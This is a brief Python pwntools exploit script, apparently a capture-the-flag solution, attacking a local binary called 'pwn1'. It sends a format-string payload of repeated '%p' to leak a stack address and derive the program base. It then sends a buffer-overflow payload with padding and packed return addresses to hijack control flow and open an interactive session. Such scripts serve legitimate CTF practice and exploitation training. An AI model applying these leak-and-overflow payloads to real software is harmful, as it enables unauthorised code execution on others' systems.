#!/usr/bin/env python 
#-*- encoding:utf-8 -*-


from pwn import *

p = process('./pwn1')

p.recvuntil("Enter your witch name:")

p.sendline("%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p")

leak_received = p.recvuntil("enter your magic spell:")
leak_values = leak_received.split(" ")


interesting_leak = int(leak_values[41], 16)
base_address = interesting_leak - 0x9e9

log.success("Base Address: %x" % base_address)


p.sendline("Expelliarmus\x00" + "A"*251 + p64(base_address + 0xa88) + p64(base_address + 0x9ec))

p.interactive()

